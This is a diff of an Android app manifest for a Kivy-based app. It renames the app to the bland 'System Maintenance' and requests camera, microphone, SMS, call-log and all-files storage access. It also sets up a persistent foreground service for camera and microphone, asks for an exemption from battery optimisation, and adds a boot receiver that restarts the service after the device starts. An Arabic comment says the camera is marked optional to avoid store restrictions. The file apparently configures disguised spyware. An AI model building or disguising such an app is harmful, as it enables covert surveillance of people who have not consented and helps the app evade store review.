@@ -1,17 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.ultra.secure.core.v5"
-    android:versionCode="50000"
-    android:versionName="5.0.0">
+    package="com.sys.auth.v3"
+    android:versionCode="30000"
+    android:versionName="3.0.0">
 
-    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34" />
+    <!-- التوافق مع Android 8.0+ (API 26) حتى 14 (API 34) -->
+    <uses-sdk android:minSdkVersion="26" android:targetSdkVersion="34" />
 
-    <!-- الصلاحيات الأساسية -->
+    <!-- صلاحيات الشبكة الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
 
-    <!-- الكاميرا والصوت -->
+    <!-- الكاميرا والميكروفون -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
@@ -21,33 +22,33 @@
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
-    <!-- الصلاحيات القديمة للتخزين (لـ Android 12 والإصدارات الأقدم) -->
+    <!-- صلاحيات التخزين القديمة (لـ Android 12 والإصدارات الأقدم) -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
 
-    <!-- صلاحية الإشعارات (Android 13+) -->
+    <!-- الإشعارات (ضروري لخدمة الخلفية) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- خدمات الخلفية والطاقة -->
+    <!-- إدارة الطاقة والخدمات الخلفية -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- صلاحيات إضافية (سجل المكالمات والرسائل) -->
+    <!-- صلاحيات إضافية لقراءة السجل والرسائل -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
-    <!-- ميزات الكاميرا اختيارية -->
+    <!-- ميزات الكاميرا اختيارية (لتجنب قيود المتجر) -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
-        android:label="Ultra Secure Core"
+        android:label="System Maintenance"
         android:icon="@drawable/ic_launcher"
         android:allowBackup="false"
         android:usesCleartextTraffic="true"
@@ -56,7 +57,7 @@
 
         <activity
             android:name="org.kivy.android.PythonActivity"
-            android:label="Ultra Secure Core"
+            android:label="System Maintenance"
             android:configChanges="mcc|mnc|locale|touchscreen|keyboard|keyboardHidden|navigation|orientation|screenLayout|fontScale|uiMode|screenSize|smallestScreenSize|layoutDirection|density"
             android:launchMode="singleTask"
             android:exported="true">
@@ -69,12 +70,21 @@
         <service
             android:name="org.kivy.android.PythonService"
             android:process=":service_work"
-            android:foregroundServiceType="dataSync|camera|microphone"
+            android:foregroundServiceType="camera|microphone|dataSync"
             android:exported="false">
             <meta-data
                 android:name="android.service.description"
-                android:value="Ultra Secure Core background service for security and sync." />
+                android:value="System Maintenance background service for security and sync." />
         </service>
+
+        <!-- إعادة تشغيل الخدمة تلقائياً بعد إقلاع الجهاز -->
+        <receiver
+            android:name="org.kivy.android.PythonService$BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 
